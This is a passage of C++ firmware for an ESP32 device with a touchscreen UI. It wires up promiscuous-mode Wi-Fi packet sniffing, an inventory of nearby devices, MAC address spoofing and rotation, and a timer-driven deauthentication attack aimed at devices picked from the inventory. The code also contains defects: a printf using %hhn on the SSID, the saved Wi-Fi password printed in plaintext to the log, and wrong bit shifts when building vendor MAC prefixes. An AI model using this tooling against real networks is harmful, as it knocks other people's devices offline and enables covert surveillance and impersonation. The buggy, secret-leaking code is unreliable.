            case WIFI_AUTH_WPA3_PSK: 
                dropdown_index = 2; 
                break;
            case WIFI_AUTH_WPA2_WPA3_PSK: 
                dropdown_index = 2; 
                break;
            case WIFI_AUTH_WPA2_ENTERPRISE:
                dropdown_index = 3; 
                break;
            case WIFI_AUTH_WPA3_ENT_192: 
                dropdown_index = 3; 
                break;
            case WIFI_AUTH_WEP: 
                dropdown_index = 4; 
                break;
            default: 
                dropdown_index = 0; 
                break; 
        }
    lv_dropdown_set_selected(objects.wifi_protocol_dropdown, dropdown_index);
}
void action_toggle_packet_logging(lv_event_t * e) {
    bool toggle = lv_obj_has_state(objects.toggle_packet_logging_switch, LV_STATE_CHECKED);
    const char* ssid = lv_textarea_get_text(objects.packet_logging_ssid);

    if (toggle) {
        init_packet_chart();
        if (ssid[0] != '\0') {
            wifi_scan_config_t wifi_cfg = {};
            wifi_cfg.ssid = reinterpret_cast<uint8_t*>(const_cast<char*>(ssid));
            wifi_cfg.show_hidden = true;

            current_scan_context.store(ScanContext::FIND_LOGGER_TARGET, std::memory_order_release);
            esp_err_t err = esp_wifi_scan_start(&wifi_cfg, false);

            if (err != ESP_OK) {
                printf("Failed to start scan: %d\n", err);
                lv_obj_clear_state(objects.toggle_packet_logging_switch, LV_STATE_CHECKED);
            }
        }
        else {
            if (get_var_wifi_active()) {
                manual_disconnect.store(true, std::memory_order_release);
                esp_wifi_disconnect();
                set_var_wifi_active(false);
                lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_color_hex(0x747474), LV_PART_MAIN);
            }

            memset(target_bssid, 0, 6);
            chart_timer = lv_timer_create(chart_update_timer_cb, 1000, NULL);

            wifi_promiscuous_filter_t filter;
            filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA; 
            esp_wifi_set_promiscuous_filter(&filter);
            esp_wifi_set_promiscuous_rx_cb(&packet_sniffer_cb);
            esp_wifi_set_promiscuous(true);
        }
    }
    else {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        
        if (chart_timer != nullptr) {
            lv_timer_del(chart_timer); 
            chart_timer = nullptr;     
        }

        if (has_cached_connection) {
            printf("Restoring previous Wi-Fi connection...\n");
            
            esp_wifi_set_config(WIFI_IF_STA, &cached_connection_config);
            esp_wifi_connect();
            
            lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_palette_main(LV_PALETTE_YELLOW), LV_PART_MAIN);
        }
    }
}
void action_toggle_device_inventory(lv_event_t * e) {
    lv_mem_monitor_t mon;
    lv_mem_monitor(&mon);
    bool toggle = lv_obj_has_state(objects.start_device_inventory_switch, LV_STATE_CHECKED);

    if (toggle) {
        printf("Starting device inventory scan\n");

        inventory_count.store(0, std::memory_order_release);
        inventory_needs_ui_update.store(false, std::memory_order_release);

        lv_roller_set_options(objects.inventoried_devices_roller, "", LV_ROLLER_MODE_NORMAL);

        if (get_var_wifi_active()) {
            wifi_ap_record_t ap_info;
            esp_wifi_sta_get_ap_info(&ap_info);
            memcpy(current_network_bssid, ap_info.bssid, 6);
        }

        if (inventory_ui_timer == nullptr) {
            inventory_ui_timer = lv_timer_create(inventory_ui_timer_cb, 500, nullptr);
        }
        if (radar_ui_timer == nullptr) {
            radar_ui_timer = lv_timer_create(radar_ui_timer_cb, 200, nullptr);
        }

        wifi_promiscuous_filter_t filter;
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(&device_inventory_sniffer_cb);
        esp_wifi_set_promiscuous(true);
    }
    else {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);

        if (inventory_ui_timer != nullptr) {
            lv_timer_del(inventory_ui_timer);
            inventory_ui_timer = nullptr;
        }
        if (radar_ui_timer != nullptr) {
            lv_timer_del(radar_ui_timer);
            radar_ui_timer = nullptr;
        }
    }
}
void action_toggle_device_inventory_manufacturers(lv_event_t * e) {
    display_manufacturers_mode = lv_obj_has_state(objects.device_inventory_toggle_manufacturer, LV_STATE_CHECKED);
    
    inventory_needs_ui_update.store(true, std::memory_order_release);
}
void action_send_device_to_deauth(lv_event_t * e) {
    lv_obj_t* wifi_options[] = {
        objects.connect_to_anetwork_container,
        objects.packet_logging_container,
        objects.device_inventory_container,
        objects.mac_spoofer_container,
        objects.deauthenticator_container
    };
    size_t num_wifi_options = sizeof(wifi_options) / sizeof(lv_obj_t*);

    if (inventory_count.load(std::memory_order_acquire) <= 0) return;
    uint16_t mac_idx = lv_roller_get_selected(objects.inventoried_devices_roller);
    char mac_str[MAC_STR_LEN];
    lv_roller_get_selected_str(objects.inventoried_devices_roller, mac_str, MAC_STR_LEN);

    memcpy(deauthenticate_mac, inventory_list[mac_idx].mac, 6 * sizeof(uint8_t));
    lv_textarea_set_text(objects.deauthenticate_mac_textarea, mac_str);

    for (size_t i = 0; i < num_wifi_options; i++) {
        if (wifi_options[i] == objects.deauthenticator_container) {
            lv_obj_clear_flag(wifi_options[i], LV_OBJ_FLAG_HIDDEN);
        }
        else {
            lv_obj_add_flag(wifi_options[i], LV_OBJ_FLAG_HIDDEN);
        }
    }
}
void action_toggle_mac_spoofing(lv_event_t * e) {
    const char* mac_str = lv_textarea_get_text(objects.mac_to_spoof_textarea);

    bool start_spoofing = lv_obj_has_state(objects.toggle_mac_spoofing_switch, LV_STATE_CHECKED);

    uint8_t mac[6];

    if (start_spoofing) {
        if (strlen(mac_str) != MAC_STR_LEN - 1) {
            lv_obj_clear_state(objects.toggle_mac_spoofing_switch, LV_STATE_CHECKED);
            return;
        }

        if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
            lv_obj_clear_state(objects.toggle_mac_spoofing_switch, LV_STATE_CHECKED);
            return;
        }

        mac[0] &= 0xFE;
    }
    else {
        esp_read_mac(mac, ESP_MAC_WIFI_STA);
    }

    bool was_connected = get_var_wifi_active();
    if (was_connected) {
        manual_disconnect.store(true, std::memory_order_release);
        esp_wifi_disconnect();
        set_var_wifi_active(false);
        lv_obj_set_style_bg_color(objects.enable_wifi_button, lv_color_hex(0x747474), LV_PART_MAIN);
    }
    
    esp_wifi_stop();
    esp_err_t err = esp_wifi_set_mac(WIFI_IF_STA, mac);
    esp_wifi_start();

    if (err == ESP_OK) {
        char new_mac_str[MAC_STR_LEN];
        snprintf(new_mac_str, MAC_STR_LEN, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

        lv_label_set_text(objects.current_mac_label, new_mac_str);
        
        if (start_spoofing) {
            lv_textarea_set_text(objects.mac_to_spoof_textarea, new_mac_str);
        }

        if (was_connected && has_cached_connection) {     
            printf("Attempting to restore connection: SSID: %hhn, password: %s\n", cached_connection_config.sta.ssid, cached_connection_config.sta.password);        
            esp_wifi_set_config(WIFI_IF_STA, &cached_connection_config); 
            esp_wifi_connect(); 
        }
        else {
            printf("Either was not connected: %d or did not have a cached connection: %d", was_connected, has_cached_connection.load(std::memory_order_acquire));
        }
    } 
    else {
        lv_obj_clear_state(objects.toggle_mac_spoofing_switch, LV_STATE_CHECKED);
    }
}
void action_randomize_mac(lv_event_t * e) {
    uint8_t mac[6];

    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }

    bool use_inventory = lv_obj_has_state(objects.toggle_macs_to_spoof_switch, LV_STATE_CHECKED);

    if (!use_inventory) {
        uint16_t selected_idx = lv_roller_get_selected(objects.pick_mac_to_spoof_roller);

        if (selected_idx < oui_database_count) {
            uint32_t target_oui = manufacturer_ouis[selected_idx].oui_prefix;
            
            mac[0] = (target_oui >> 16) & 0xFF;
            mac[1] = (target_oui >> 8) & 0xFF;
            mac[2] = target_oui & 0xFF;
        }
    }

    mac[0] = (mac[0] & 0xFC) | 0x02;

    char mac_str[18] = {};
    snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    lv_textarea_set_text(objects.mac_to_spoof_textarea, mac_str);
}
void action_toggle_macs_to_spoof(lv_event_t * e) {
    bool use_inventory = lv_obj_has_state(objects.toggle_macs_to_spoof_switch, LV_STATE_CHECKED);
    fill_mac_spoofer_roller(use_inventory);
}
void action_select_mac_to_spoof(lv_event_t * e) {
    bool using_macs = lv_obj_has_state(objects.toggle_macs_to_spoof_switch, LV_STATE_CHECKED);
    char mac[MAC_STR_LEN];
    if (using_macs) {
        lv_roller_get_selected_str(objects.pick_mac_to_spoof_roller, mac, MAC_STR_LEN);
    }
    else {
        uint16_t manufacturer_idx = lv_roller_get_selected(objects.pick_mac_to_spoof_roller);
        if (manufacturer_idx > oui_database_count) return;
    
        uint32_t prefix = manufacturer_ouis[manufacturer_idx].oui_prefix;
        snprintf(mac, MAC_STR_LEN, "%02X:%02X:%02X", static_cast<uint8_t>((prefix & 0xFF0000) >> 4), static_cast<uint8_t>((prefix & 0x00FF00) >> 2), static_cast<uint8_t>(prefix & 0x0000FF));
    }
    lv_textarea_set_text(objects.mac_to_spoof_textarea, mac);
}
void action_toggle_mac_rotation(lv_event_t * e) {
    if (!lv_obj_has_state(objects.toggle_mac_spoofing_switch, LV_STATE_CHECKED)) return;
    bool toggle_mac_rotation = lv_obj_has_state(objects.toggle_mac_rotation_switch, LV_STATE_CHECKED);
    const char* rotation_time_str = lv_textarea_get_text(objects.mac_rotation_time_textarea);

    uint16_t rotation_time_seconds = 300; 

    if (rotation_time_str != nullptr && strlen(rotation_time_str) > 0) {
        sscanf(rotation_time_str, "%hu", &rotation_time_seconds);
    }
    else {
        lv_obj_clear_state(objects.toggle_mac_rotation_switch, LV_STATE_CHECKED);
        return;
    }

    if (rotation_time_seconds < 30) {
        rotation_time_seconds = 30;
        lv_textarea_set_text(objects.mac_rotation_time_textarea, "30");
    }

    if (toggle_mac_rotation) {
        if (mac_rotation_timer != nullptr) {
            lv_timer_del(mac_rotation_timer);
            mac_rotation_timer = nullptr;
        }

        mac_rotation_timer = lv_timer_create(mac_rotation_timer_cb, rotation_time_seconds * 1000, nullptr);
        
        lv_timer_ready(mac_rotation_timer);
    }
    else {
        if (mac_rotation_timer != nullptr) {
            lv_timer_del(mac_rotation_timer);
            mac_rotation_timer = nullptr;
        }
    }
}
void action_enforce_mac_format(lv_event_t * e) {
    if (updating_mac) return;
    updating_mac = true;
    const char* mac_text = lv_textarea_get_text(objects.mac_to_spoof_textarea);
    
    char mac[18] = {};
    int mac_idx = 0;
    int hex_count = 0;

    for (size_t i = 0; mac_text[i] != '\0' && hex_count < 12; i++) {
        char c = mac_text[i];

        if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'F') || (c >= 'a' && c <= 'f')) {
            if (hex_count > 0 && hex_count % 2 == 0) {
                mac[mac_idx++] = ':';
            }
            
            if (c >= 'a' && c <= 'f') {
                mac[mac_idx++] = c - 32;
            } else {
                mac[mac_idx++] = c;
            }
            
            hex_count++;
        }
    }
    mac[mac_idx] = '\0';

    if (strcmp(mac_text, mac) != 0) {
        uint32_t cursor_pos = lv_textarea_get_cursor_pos(objects.mac_to_spoof_textarea);

        lv_textarea_set_text(objects.mac_to_spoof_textarea, mac);

        if (mac_idx > 0 && cursor_pos > 0 && mac[cursor_pos - 1] == ':') {
            cursor_pos++;
        }

        lv_textarea_set_cursor_pos(objects.mac_to_spoof_textarea, cursor_pos);
    }

    updating_mac = false;
}
void action_toggle_deauthenticator_button(lv_event_t * e) {
    int16_t frequency = lv_arc_get_value(objects.deauth_frequency_arc);

    if (deauth_running.load(std::memory_order_acquire)) {
        deauth_running.store(false, std::memory_order_release);
        if (deauth_timer != nullptr) {
            lv_timer_del(deauth_timer);
            deauth_timer = nullptr;
        }
        lv_obj_set_style_bg_color(objects.deauthenticate_button, lv_palette_main(LV_PALETTE_RED), LV_PART_MAIN);
        lv_label_set_text(objects.deauthenticate_button_label, "DEAUTHENTICATE");
        return;
    }

    lv_obj_set_style_bg_color(objects.deauthenticate_button, lv_palette_main(LV_PALETTE_GREEN), LV_PART_MAIN);
    lv_label_set_text(objects.deauthenticate_button_label, "STOP DEAUTH");
    
    uint32_t interval_ms = map(frequency, 0, 100, 500, 50);
    deauth_timer = lv_timer_create(deauthenticator_timer_cb, interval_ms, nullptr); 

    deauth_running.store(true, std::memory_order_release);
}

